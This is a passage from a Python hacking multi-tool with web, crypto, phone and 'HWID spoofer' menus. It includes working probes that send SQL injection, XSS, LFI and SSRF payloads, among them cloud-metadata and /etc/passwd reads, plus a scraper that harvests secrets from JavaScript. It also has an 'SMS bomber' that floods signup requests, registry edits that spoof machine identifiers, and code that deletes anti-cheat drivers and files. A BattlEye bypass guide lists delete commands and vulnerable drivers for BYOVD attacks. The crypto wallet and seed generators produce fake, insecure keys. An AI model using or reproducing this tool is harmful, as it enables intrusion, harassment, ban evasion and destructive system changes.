            print(f"  {G if d else DIM}[{'X' if d else ' '}]{RST} {n}")
        _hist_log("WEB","Tech",url)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def w_cms():
    banner_s("CMS DETECT"); url = ask("URL:").rstrip("/")
    for c, paths in {"WordPress":["/wp-login.php","/wp-admin/"],"Joomla":["/administrator/"],"Drupal":["/user/login"]}.items():
        for p in paths:
            try:
                r = requests.get(url + p, timeout=4)
                if r.status_code in (200,301,302): print(f"  {G}[FOUND]{RST} {c}"); break
            except Exception: pass
    _hist_log("WEB","CMS",url); pause()
def w_admin():
    banner_s("ADMIN FINDER"); url = ask("URL:").rstrip("/")
    for p in ["/admin","/administrator","/wp-admin","/panel","/login","/backend","/cpanel"]:
        try:
            r = requests.get(url + p, timeout=4)
            if r.status_code in (200,301,302): print(f"  {G}[{r.status_code}]{RST} {url+p}")
        except Exception: pass
    _hist_log("WEB","Admin",url); pause()
def w_dir():
    banner_s("DIR BRUTE"); url = ask("URL:").rstrip("/")
    for p in ["backup","config","admin",".git",".env","test","dev","uploads","files"]:
        try:
            r = requests.get(f"{url}/{p}", timeout=3)
            if r.status_code in (200,301,302,403): print(f"  {Y}[{r.status_code}]{RST} {url}/{p}")
        except Exception: pass
    _hist_log("WEB","Dir",url); pause()
def w_sqli():
    banner_s("SQLI"); url = ask("URL:"); hits = []
    for pl in ["'", "' OR '1'='1", "' OR 1=1--", "1 UNION SELECT NULL--"]:
        try:
            r = requests.get(url + pl, timeout=5)
            if any(e in r.text.lower() for e in ["sql syntax","mysql_fetch","syntax error"]):
                print(f"  {R}[VULN]{RST} {pl}"); hits.append(pl)
        except Exception: pass
    _hist_log("WEB","SQLi",f"{url}:{len(hits)}"); pause()
def w_xss():
    banner_s("XSS"); url = ask("URL:"); hits = []
    for pl in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]:
        try:
            r = requests.get(url + pl, timeout=6)
            if pl.lower() in r.text.lower(): print(f"  {R}[REFLECTED]{RST} {pl[:40]}"); hits.append(pl)
        except Exception: pass
    _hist_log("WEB","XSS",f"{url}:{len(hits)}"); pause()
def w_jwt():
    banner_s("JWT ANALYZE"); p = ask("JWT:").split(".")
    if len(p) == 3:
        try:
            dp = lambda x: json.loads(base64.urlsafe_b64decode((x + "=" * ((4 - len(x) % 4) % 4)).encode()))
            print(f"\n  {Y}Header{RST}:"); pkv(dp(p[0]), 1)
            print(f"\n  {Y}Payload{RST}:"); pkv(dp(p[1]), 1)
            _hist_log("WEB","JWT","ok")
        except Exception as e: print(f"{ERR} {e}")
    pause()
def w_waf():
    banner_s("WAF"); url = ask("URL:")
    try:
        h = str(requests.get(url, timeout=6).headers).lower()
        for w, s in {"Cloudflare":"cf-ray","AWS":"x-amzn","Akamai":"akamai","Sucuri":"sucuri","Fastly":"x-fastly"}.items():
            if s in h: print(f"  {R}[WAF]{RST} {w}")
        _hist_log("WEB","WAF",url)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def w_short():
    banner_s("SHORTENER")
    try:
        r = requests.get(f"http://tinyurl.com/api-create.php?url={ask('URL:')}", timeout=8)
        print(f"\n{OK} {G}{r.text}{RST}"); _hist_log("WEB","Short","ok"); clip_pause(r.text.strip())
    except Exception as e: print(f"{ERR} {e}"); pause()
def w_paste():
    banner_s("PASTEBIN"); c = ask("Content or file:")
    if os.path.isfile(c): c = open(c, encoding="utf-8", errors="ignore").read()
    try:
        r = requests.post("https://paste.rs/", data=c.encode(), timeout=8)
        print(f"\n{OK} {G}{r.text.strip()}{RST}"); _hist_log("WEB","Paste","ok"); clip_pause(r.text.strip())
    except Exception as e: print(f"{ERR} {e}"); pause()
def w_lfi():
    banner_s("LFI"); url = ask("URL with ?file="); hits = []
    for pl in ["../../../etc/passwd","../../../../etc/passwd","/etc/passwd"]:
        try:
            r = requests.get(url + pl, timeout=5)
            if "root:x:" in r.text: print(f"  {R}[LFI]{RST} {pl}"); hits.append(pl)
        except Exception: pass
    _hist_log("WEB","LFI",f"{url}:{len(hits)}"); pause()
def w_ssrf():
    banner_s("SSRF"); url = ask("URL with ?url="); hits = []
    for pl in ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"]:
        try:
            r = requests.get(url + pl, timeout=5)
            if any(s in r.text for s in ["root:x:","ami-","localhost"]):
                print(f"  {R}[SSRF]{RST} {pl}"); hits.append(pl)
        except Exception: pass
    _hist_log("WEB","SSRF",f"{url}:{len(hits)}"); pause()
def w_vuln():
    banner_s("VULN SCAN"); url = ask("URL:").rstrip("/")
    try:
        r = requests.get(url, timeout=6)
        for h, m in {"Strict-Transport-Security":"HSTS missing","X-Frame-Options":"Clickjacking","Content-Security-Policy":"No CSP"}.items():
            if h not in r.headers: print(f"  {Y}[WARN]{RST} {m}")
    except Exception: pass
    for p in ["/.git/config","/.env","/wp-config.php","/backup.zip","/dump.sql","/phpinfo.php"]:
        try:
            r = requests.get(url + p, timeout=3)
            if r.status_code == 200 and len(r.text) > 10: print(f"  {R}[EXPOSED]{RST} {url+p}")
        except Exception: pass
    _hist_log("WEB","Vuln",url); pause()
def w_takeover():
    banner_s("SUB TAKEOVER"); d = ask("Domain:")
    for s in ["www","mail","dev","test","api","cdn","blog","shop"]:
        fqdn = f"{s}.{d}"
        try: ip = socket.gethostbyname(fqdn); print(f"  {DIM}[{ip}] {fqdn}{RST}")
        except Exception: print(f"  {DIM}[NX]{RST} {fqdn}")
    _hist_log("WEB","Takeover",d); pause()
def w_js():
    banner_s("JS SECRETS"); url = ask("URL:")
    pats = {"API Key": r'api[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{16,64})',
            "Google API": r'AIza[0-9A-Za-z\-_]{35}',
            "Discord": r'[MN][A-Za-z0-9]{23,25}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}',
            "AWS": r'AKIA[0-9A-Z]{16}', "JWT": r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'}
    found = []
    try:
        r = requests.get(url, timeout=8)
        for n, pat in pats.items():
            for m in re.findall(pat, r.text):
                print(f"  {R}[{n}]{RST} {Y}{m[:80]}{RST}"); found.append(f"{n}: {m}")
        _hist_log("WEB","JS",f"{url}:{len(found)}")
        if found: clip_pause("\n".join(found)); return
    except Exception as e: print(f"{ERR} {e}")
    pause()
def w_defang():
    banner_s("URL DEFANG"); url = ask("URL:")
    if not url: pause(); return
    d = url.replace("http://","hxxp://").replace("https://","hxxps://").replace(".","[.]")
    print(f"\n  {Y}Defanged{RST}: {G}{d}{RST}"); _hist_log("WEB","Defang",url[:40]); clip_pause(d)
def w_http():
    banner_s("HTTP METHODS"); url = ask("URL:")
    methods = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD","TRACE","CONNECT","PROPFIND"]
    for m in methods:
        try:
            r = requests.request(m, url, timeout=6, allow_redirects=False)
            col = G if r.status_code < 400 else Y if r.status_code < 500 else R
            note = f" {R}[DANGEROUS]{RST}" if m in ("PUT","DELETE") and r.status_code < 400 else ""
            print(f"  {col}[{r.status_code}]{RST} {m:<10}{note}")
        except Exception: pass
        time.sleep(0.15)
    _hist_log("WEB","Methods",url); pause()

# ========================================================================
# CRYPTO
# ========================================================================
def crypto_menu():
    while True:
        menu_box("CRYPTO", [
            ("1","Wallet Gen"),("2","Seed Phrase"),("3","Prices"),
            ("4","Address Validator"),("5","Vanity"),("6","TX Lookup"),
            ("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": cr_wallet()
        elif c == "2": cr_seed()
        elif c == "3": cr_prices()
        elif c == "4": cr_valid()
        elif c == "5": cr_vanity()
        elif c == "6": cr_tx()
        elif c == "0": break
def cr_wallet():
    banner_s("WALLET GEN"); import secrets; n = ask_int("Count:", 5); ws = []
    for _ in range(n):
        p = secrets.token_bytes(32)
        addr = f"1{base64.b64encode(hashlib.sha256(p).digest()).decode()[:33]}"
        print(f"  {Y}BTC{RST}: {addr}\n  {Y}Key{RST}: {p.hex()}\n"); ws.append(f"{addr} | {p.hex()}")
    _hist_log("CRYPTO","Wallet",str(n)); clip_pause("\n".join(ws))
def cr_seed():
    banner_s("SEED GEN")
    words = ["abandon","ability","able","about","above","absorb","abstract","absurd","abuse",
             "access","accident","account","accuse","achieve","acid","acoustic","acquire",
             "across","act","action","actor","actress"]
    seeds = []
    for _ in range(ask_int("Count:", 5)):
        s = ' '.join(random.choices(words, k=12)); print(f"  {G}→{RST} {s}"); seeds.append(s)
    _hist_log("CRYPTO","Seed",str(len(seeds))); clip_pause("\n".join(seeds))
def cr_prices():
    banner_s("CRYPTO PRICES")
    try:
        r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin,ripple,dogecoin&vs_currencies=usd&include_24hr_change=true", timeout=8).json()
        for k, v in r.items():
            ch = v.get("usd_24h_change", 0); col = G if ch >= 0 else R
            print(f"  {Y}{k.upper():<8}{RST} ${v['usd']:>12,.2f}  {col}{ch:+.2f}%{RST}")
        _hist_log("CRYPTO","Price","ok")
    except Exception as e: print(f"{ERR} {e}")
    pause()
def cr_valid():
    banner_s("VALIDATOR"); a = ask("Address:")
    t = "BTC Legacy" if a.startswith("1") and 25 <= len(a) <= 34 else \
        "BTC P2SH" if a.startswith("3") and 25 <= len(a) <= 34 else \
        "BTC SegWit" if a.startswith("bc1") else \
        "ETH/EVM" if a.startswith("0x") and len(a) == 42 else "UNKNOWN"
    print(f"  {G if t != 'UNKNOWN' else R}[{t}]{RST}"); _hist_log("CRYPTO","Val",a[:20]); pause()
def cr_vanity():
    banner_s("VANITY"); p = ask("Prefix (ex: 1Leak):")
    print(f"\n  {Y}Diff{RST}: 1 in {58 ** (len(p)-1):,}\n  {DIM}Use VanitySearch (GPU){RST}")
    _hist_log("CRYPTO","Vanity",p); pause()
def cr_tx():
    banner_s("TX LOOKUP"); c = ask("[1]BTC [2]ETH [3]Wallet:", "1"); q = ask("Hash/Address:")
    links = {"1": [f"https://blockchain.info/tx/{q}"], "2": [f"https://etherscan.io/tx/{q}"],
             "3": [f"https://blockchain.info/address/{q}", f"https://etherscan.io/address/{q}"]}.get(c, [])
    for l in links: print(f"  {G}→{RST} {DIM}{l}{RST}")
    _hist_log("CRYPTO","TX",q[:30]); clip_pause("\n".join(links))

# ========================================================================
# PHONE
# ========================================================================
def phone_menu():
    while True:
        menu_box("PHONE / SMS", [
            ("1","Number Lookup"),("2","SMS Bomber"),("3","Virtual Numbers"),
            ("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": ph_lookup()
        elif c == "2": ph_bomber()
        elif c == "3": ph_virt()
        elif c == "0": break
def ph_lookup():
    banner_s("NUMBER LOOKUP"); n = ask("Number (+cc):"); links = []
    for name, u in [("Google", f"https://google.com/search?q=%22{n}%22"),
                    ("Truecaller", f"https://truecaller.com/search/en/{n.lstrip('+')}"),
                    ("Sync.ME", f"https://sync.me/?q={n.lstrip('+')}"),
                    ("Telegram", f"https://t.me/{n.lstrip('+')}"),
                    ("WhatsApp", f"https://wa.me/{n.lstrip('+')}")]:
        print(f"  {G}[{name}]{RST} {DIM}{u}{RST}"); links.append(u)
    _hist_log("PHONE","Lookup",n); clip_pause("\n".join(links))
def ph_bomber():
    banner_s("SMS BOMBER"); n = ask("Number:"); c = ask_int("Count:", 10)
    for i in range(1, c + 1):
        try:
            requests.post("https://auth.roblox.com/v2/signup",
                          json={"username": f"c6r6{random.randint(1000,9999)}",
                                "password": "C6R6Cyxxk123!", "birthday": "2000-01-01", "gender": 2},
                          timeout=3)
        except Exception: pass
        print(f"  {Y}[{i}/{c}]{RST}"); time.sleep(0.5)
    _hist_log("PHONE","Bomber",f"{n}:{c}"); pause()
def ph_virt():
    banner_s("VIRTUAL NUMBERS")
    for name, url, p in [("SMS-Activate", "https://sms-activate.org", "~0.10"),
                         ("5sim", "https://5sim.net", "~0.10"),
                         ("SMSPVA", "https://smspva.com", "~0.10"),
                         ("ReceiveSMS", "https://receivesms.co", "FREE")]:
        print(f"  {G}[{p}]{RST} {name:<16} {DIM}{url}{RST}")
    _hist_log("PHONE","Virtual","ok"); pause()

# ========================================================================
# HWID
# ========================================================================
def _need_admin():
    if not _is_win(): return True
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception: return False
def _require_admin():
    if not _need_admin():
        print(f"  {R}[X]{RST} Admin required."); pause(); return False
    return True
def hwid_menu():
    while True:
        menu_box("HWID SPOOFER", [
            ("1","Show HWID"),("2","Fingerprint"),("3","Full Spoof"),
            ("4","Windows ID"),("5","Random HWID"),("6","Disk Serial"),
            ("7","MAC Spoof"),("8","Volume Serial"),("9","Reg Cleaner"),
            ("10","VM Detect"),("11","Ban Check"),("12","BE Guide"),
            ("13","Valorant"),("14","Roblox"),("15","Fortnite"),
            ("16","Minecraft"),("17","Steam Clean"),("18","Discord Clean"),
            ("19","Browser Clean"),("20","Guide"),("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        fns = {"1": hw_show, "2": hw_fp, "3": hw_full, "4": hw_win, "5": hw_rand,
               "6": hw_disk, "7": hw_mac, "8": hw_vol, "9": hw_reg, "10": hw_vm,
               "11": hw_ban, "12": hw_be, "13": hw_val, "14": hw_rbx, "15": hw_fn,
               "16": hw_mc, "17": hw_steam, "18": hw_dc, "19": hw_br, "20": hw_guide}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def hw_show():
    banner_s("MY HWID")
    if _is_win():
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
            g, _ = winreg.QueryValueEx(k, "MachineGuid"); winreg.CloseKey(k)
            print(f"  {Y}Machine GUID{RST}: {G}{g}{RST}")
        except Exception: pass
    print(f"  {Y}Hostname{RST}: {G}{platform.node()}{RST}")
    print(f"  {Y}CPU{RST}     : {G}{platform.processor()}{RST}")
    import uuid
    mac = ':'.join(f'{(uuid.getnode() >> e) & 0xff:02x}' for e in range(40, -8, -8))
    print(f"  {Y}MAC{RST}     : {G}{mac}{RST}")
    print(f"  {DIM}License HWID : {G}{_hwid()}{RST}")
    _hist_log("HWID","Show",_hwid()[:16]); clip_pause(_hwid())
def hw_fp():
    banner_s("FINGERPRINT")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    def wmi(cls, prop):
        try:
            ps = f"(Get-CimInstance -ClassName Win32_{cls} | Select-Object -ExpandProperty {prop})"
            o = subprocess.run(["powershell","-NoProfile","-Command",ps],
                               capture_output=True, text=True, timeout=10).stdout
            return [l.strip() for l in o.splitlines() if l.strip()]
        except Exception: return []
    lines = []
    for lbl, c, p in [("CPU","Processor","ProcessorId"),("BIOS","BIOS","SerialNumber"),
                      ("Baseboard","BaseBoard","SerialNumber"),
                      ("UUID","ComputerSystemProduct","UUID"),
                      ("Disk","DiskDrive","SerialNumber"),
                      ("RAM","PhysicalMemory","SerialNumber"),
                      ("MAC","NetworkAdapter","MACAddress")]:
        for v in wmi(c, p)[:1]:
            print(f"  {Y}{lbl:<12}{RST} {W}{v}{RST}"); lines.append(f"{lbl}: {v}")
    _hist_log("HWID","FP",str(len(lines))); clip_pause("\n".join(lines))
def hw_full():
    banner_s("FULL SPOOF")
    if not _require_admin(): return
    import winreg, uuid
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} MachineGUID")
    except Exception as e: print(f"  {R}[FAIL]{RST} {e}")
    hn = "DESKTOP-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=7))
    for p in [r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName",
              r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName"]:
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, p, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "ComputerName", 0, winreg.REG_SZ, hn); winreg.CloseKey(k)
        except Exception: pass
    print(f"  {G}[OK]{RST} Hostname → {hn}")
    cleared = 0
    for td in [os.environ.get("TEMP",""), os.environ.get("TMP",""),
               r"C:\Windows\Prefetch", r"C:\Windows\Temp"]:
        if not td or not os.path.isdir(td): continue
        for entry in os.listdir(td):
            fp = os.path.join(td, entry)
            try:
                if os.path.isfile(fp): os.remove(fp); cleared += 1
                elif os.path.isdir(fp): shutil.rmtree(fp, ignore_errors=True); cleared += 1
            except (PermissionError, OSError): pass   # fichier verrouillé → skip
    print(f"  {G}[OK]{RST} Temp cleared ({cleared} items)\n  {R}[!]{RST} Reboot required.")
    _hist_log("HWID","Full","ok"); pause()
def hw_win():
    banner_s("WINDOWS ID")
    if not _require_admin(): return
    import uuid
    for n, cmd in [
        ("MachineGUID", f'reg add "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid /t REG_SZ /d "{uuid.uuid4()}" /f'),
        ("ProductId", f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductId /t REG_SZ /d "{random.randint(10000,99999)}-{random.randint(10000,99999)}" /f'),
    ]:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(f"  {G if r.returncode == 0 else R}[{'OK' if r.returncode == 0 else 'FAIL'}]{RST} {n}")
    _hist_log("HWID","WinID","ok"); pause()
def hw_rand():
    banner_s("RANDOM HWID"); import uuid
    txt = (f"MachineGUID: {str(uuid.uuid4()).upper()}\n"
           f"MAC: {':'.join(f'{random.randint(0,255):02X}' for _ in range(6))}\n"
           f"Disk Serial: {''.join(random.choices(string.ascii_uppercase + string.digits, k=20))}\n"
           f"Hostname: DESKTOP-{''.join(random.choices(string.ascii_uppercase + string.digits, k=7))}")
    for l in txt.split("\n"):
        a, b = l.split(":", 1); print(f"  {Y}{a}{RST}:{b}")
    _hist_log("HWID","Rand","ok"); clip_pause(txt)
def hw_disk():
    banner_s("DISK SERIAL")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    s1 = f"{random.randint(0x1000, 0xFFFF):04X}-{random.randint(0x1000, 0xFFFF):04X}"
    s2 = f"{random.randint(0x1000, 0xFFFF):04X}-{random.randint(0x1000, 0xFFFF):04X}"
    print(f"  {Y}Generated{RST}:")
    print(f"    C: → {G}{s1}{RST}")
    print(f"    D: → {G}{s2}{RST}")
    print(f"\n  {DIM}Note: volumeid.exe (Sysinternals) requis pour l'application.{RST}\n")
    if ask("Appliquer via volumeid.exe? (y/n):", "n").lower() in ("y","o"):
        if not _require_admin(): return
        for drive, serial in [("C:", s1), ("D:", s2)]:
            vol_cmd = f'volumeid.exe {drive} {serial.replace("-","")}'
            r = subprocess.run(vol_cmd, shell=True, capture_output=True, text=True)
            if r.returncode == 0:
                print(f"  {G}[OK]{RST} {drive} → {serial}")
            else:
                # fallback: label + format hex sans tiret via label trick
                hex_serial = serial.replace("-","")
                r2 = subprocess.run(
                    f'reg add "HKLM\\SYSTEM\\MountedDevices" /f',
                    shell=True, capture_output=True)
                print(f"  {Y}[WARN]{RST} {drive} volumeid.exe absent ou échec (rc={r.returncode})")
                print(f"  {DIM}Copie commande: volumeid {drive} {serial.replace('-','')}{RST}")
        print(f"  {R}[!]{RST} Reboot recommandé.")
    _hist_log("HWID","Disk",s1); clip_pause(f"C: {s1}\nD: {s2}")
def hw_mac():
    banner_s("MAC SPOOF")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    print(subprocess.run(["getmac","/v","/fo","list"], capture_output=True, text=True).stdout[:600])
    iface = ask("Interface (exact name):")
    nm = "".join(f"{random.randint(0,255):02X}" for _ in range(6))
    mfmt = ':'.join(nm[i:i+2] for i in range(0, 12, 2))
    print(f"\n  {Y}New MAC{RST}: {G}{mfmt}{RST}")
    if ask("Apply? (y/n):", "n").lower() in ("y","o") and _require_admin():
        try:
            subprocess.run(["netsh","interface","set","interface",iface,"disable"], capture_output=True)
            time.sleep(1)
            import winreg
            nk = r"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, nk)
            for i in range(winreg.QueryInfoKey(k)[0]):
                try:
                    sub = winreg.EnumKey(k, i); sk = winreg.OpenKey(k, sub, 0, winreg.KEY_ALL_ACCESS)
                    try:
                        desc, _ = winreg.QueryValueEx(sk, "DriverDesc")
                        if iface.lower() in desc.lower():
                            winreg.SetValueEx(sk, "NetworkAddress", 0, winreg.REG_SZ, nm)
                            print(f"  {G}[OK]{RST} {desc}")
                    except Exception: pass
                    winreg.CloseKey(sk)
                except Exception: pass
            winreg.CloseKey(k)
            subprocess.run(["netsh","interface","set","interface",iface,"enable"], capture_output=True)
            _hist_log("HWID","MAC",mfmt)
        except Exception as e: print(f"{ERR} {e}")
    pause()
def hw_vol():
    banner_s("VOLUME SERIAL")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    drive = ask("Drive (C/D/E):", "C").upper().rstrip(":") + ":"
    s = f"{random.randint(0x1000, 0xFFFF):04X}-{random.randint(0x1000, 0xFFFF):04X}"
    print(f"  {Y}Drive{RST}  : {W}{drive}{RST}")
    print(f"  {Y}Serial{RST} : {G}{s}{RST}")
    if ask("Appliquer? (y/n):", "n").lower() in ("y","o"):
        if not _require_admin(): return
        r = subprocess.run(f'volumeid.exe {drive} {s.replace("-","")}',
                           shell=True, capture_output=True, text=True)
        if r.returncode == 0:
            print(f"  {G}[OK]{RST} Applied. Reboot.")
        else:
            print(f"  {Y}[WARN]{RST} volumeid.exe absent (rc={r.returncode})")
            print(f"  {DIM}Cmd manuelle: volumeid {drive} {s.replace('-','')}{RST}")
    _hist_log("HWID","Vol",s); clip_pause(s)
def hw_reg():
    banner_s("REG CLEAN")
    if not _require_admin(): return
    import winreg, uuid
    for p, vals in [(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", ["InstallationID"]),
                    (r"SOFTWARE\Microsoft\SQMClient", ["MachineId"])]:
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, p, 0, winreg.KEY_ALL_ACCESS)
            for v in vals:
                try:
                    winreg.SetValueEx(k, v, 0, winreg.REG_SZ, str(uuid.uuid4()).upper()[:20])
                    print(f"  {G}[OK]{RST} {p}\\{v}")
                except Exception: pass
            winreg.CloseKey(k)
        except Exception: pass
    _hist_log("HWID","Reg","ok"); pause()
def hw_vm():
    banner_s("VM DETECT")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    ind = []
    o = subprocess.run(["tasklist"], capture_output=True, text=True).stdout.lower()
    for p in ["vboxservice","vmtoolsd","vmwaretray","qemu-ga"]:
        if p in o: ind.append(f"proc: {p}")
    for d in ["vmmouse.sys","vmhgfs.sys","vboxguest.sys"]:
        if os.path.isfile(os.path.join(r"C:\Windows\System32\drivers", d)): ind.append(f"drv: {d}")
    if ind:
        print(f"  {R}[VM DETECTED]{RST}")
        for i in ind: print(f"    {R}→{RST} {i}")
    else: print(f"  {G}[CLEAN]{RST}")
    _hist_log("HWID","VM",str(len(ind))); pause()
def hw_ban():
    banner_s("BAN CHECK")
    for p in [os.path.expandvars(r"%ProgramData%\EasyAntiCheat"),
              os.path.expandvars(r"%ProgramFiles%\Common Files\BattlEye")]:
        s = f"{R}[FOUND]{RST}" if os.path.exists(p) else f"{DIM}[-]{RST}"
        print(f"  {s} {p}")
    try:
        o = subprocess.run(r'reg query "HKLM\SYSTEM\ControlSet001\Services\vgk" /v ErrorControl',
                           capture_output=True, text=True, shell=True).stdout.lower()
        if "errorcontrol" in o: print(f"  {R}[VANGUARD KERNEL]{RST}")
    except Exception: pass
    _hist_log("HWID","Ban","ok"); pause()
def hw_be():
    banner_s("BATTLEYE GUIDE")
    print(f"""
{R}+--[ BattlEye Bypass ]---------------+{RST}
{Y}SOFT:{RST}
  {G}1.{RST} MAC + IP change
  {G}2.{RST} New Steam account
  {G}3.{RST} MachineGUID + Volume Serial
  {G}4.{RST} rmdir /s /q "%ProgramFiles%\\Common Files\\BattlEye"
  {G}5.{RST} del /f /q "%APPDATA%\\BattlEye\\*.log"

{Y}HARD:{RST} + new SID + Disk Serial + fresh install

{Y}BYOVD:{RST}
  {G}→{RST} WinRing0x64.sys
  {G}→{RST} RTCore64.sys
  {G}→{RST} dbutil_2_3.sys
""")
    pause()
def hw_val():
    banner_s("VALORANT")
    if not _require_admin(): return
    import uuid, winreg
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} GUID")
    except Exception: pass
    for f in [r"C:\Program Files\Riot Vanguard", r"C:\Windows\System32\drivers\vgk.sys"]:
        if os.path.exists(f):
            try:
                if os.path.isfile(f): os.remove(f)
                else: shutil.rmtree(f, ignore_errors=True)
                print(f"  {G}[OK]{RST} removed {f}")
            except Exception as e: print(f"  {R}[FAIL]{RST} {f}: {e}")
    _hist_log("HWID","Valorant","ok"); pause()
def hw_rbx():
    banner_s("ROBLOX SPOOF")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    c = 0
    for p in [os.path.join(os.environ.get("APPDATA",""), "Roblox"),
              os.path.join(os.environ.get("LOCALAPPDATA",""), "Roblox")]:
        if os.path.isdir(p):
            for root, _, files in os.walk(p):
                for f in files:
                    if any(t in f.lower() for t in ["cookies","localstoragedb",".log",".dmp"]):
                        try: os.remove(os.path.join(root, f)); c += 1
                        except Exception: pass
    print(f"  {G}[OK]{RST} {c} files"); _hist_log("HWID","Roblox",str(c)); pause()
def hw_fn():
    banner_s("FORTNITE")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    import uuid, winreg
    lo = os.environ.get("LOCALAPPDATA","")
    for p in [os.path.join(lo, "EpicGamesLauncher","Saved"), os.path.join(lo, "FortniteGame","Saved")]:
        if os.path.isdir(p):
            for s in ["Logs","Cache","Crashes","webcache"]:
                sp = os.path.join(p, s)
                if os.path.isdir(sp):
                    try: shutil.rmtree(sp); os.makedirs(sp)
                    except Exception: pass
            print(f"  {G}[OK]{RST} {p}")
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} GUID")
    except Exception: pass
    _hist_log("HWID","Fortnite","ok"); pause()
def hw_mc():
    banner_s("MINECRAFT")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    import uuid, winreg
    mc = os.path.join(os.environ.get("APPDATA",""), ".minecraft")
    pp = os.path.join(mc, "launcher_profiles.json")
    if os.path.isfile(pp):
        try:
            d = json.load(open(pp, encoding="utf-8", errors="ignore"))
            d["authenticationDatabase"] = {}; d["selectedUser"] = {}
            json.dump(d, open(pp, "w", encoding="utf-8"), indent=2)
            print(f"  {G}[OK]{RST} profiles")
        except Exception: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} GUID")
    except Exception: pass
    _hist_log("HWID","MC","ok"); pause()
def hw_steam():
    banner_s("STEAM CLEAN")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    import winreg, glob
    sp = None
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        sp, _ = winreg.QueryValueEx(k, "SteamPath"); winreg.CloseKey(k)
    except Exception:
        for p in [r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam"]:
            if os.path.isdir(p): sp = p; break
    if sp:
        for t in ["config/loginusers.vdf","config/config.vdf","userdata","logs","dumps"]:
            for fp in glob.glob(os.path.join(sp, t)):
                try:
                    if os.path.isfile(fp): os.remove(fp)
                    else: shutil.rmtree(fp, ignore_errors=True)
                except Exception: pass
        print(f"  {G}[OK]{RST} cleaned")
    _hist_log("HWID","Steam","ok"); pause()
def hw_dc():
    banner_s("DISCORD CLEAN")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    ad = os.environ.get("APPDATA",""); c = 0
    for d in ["Discord","discordptb","discordcanary"]:
        p = os.path.join(ad, d)
        if not os.path.isdir(p): continue
        for t in ["Local Storage","Session Storage","Cache","Code Cache","GPUCache","logs","Crashpad","Network","Cookies"]:
            tp = os.path.join(p, t)
            if os.path.isdir(tp):
                try: shutil.rmtree(tp); c += 1
                except Exception: pass
        print(f"  {G}[OK]{RST} {d}")
    print(f"  {G}[OK]{RST} {c} folders"); _hist_log("HWID","DC",str(c)); pause()
def hw_br():
    banner_s("BROWSER CLEAN")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    lo = os.environ.get("LOCALAPPDATA",""); t = 0
    for bn, bp in [("Chrome", os.path.join(lo, "Google","Chrome","User Data","Default")),
                   ("Edge", os.path.join(lo, "Microsoft","Edge","User Data","Default")),
                   ("Brave", os.path.join(lo, "BraveSoftware","Brave-Browser","User Data","Default"))]:
        if not os.path.isdir(bp): continue
        for f in ["Cookies","History","Login Data","Web Data","Network","Cache"]:
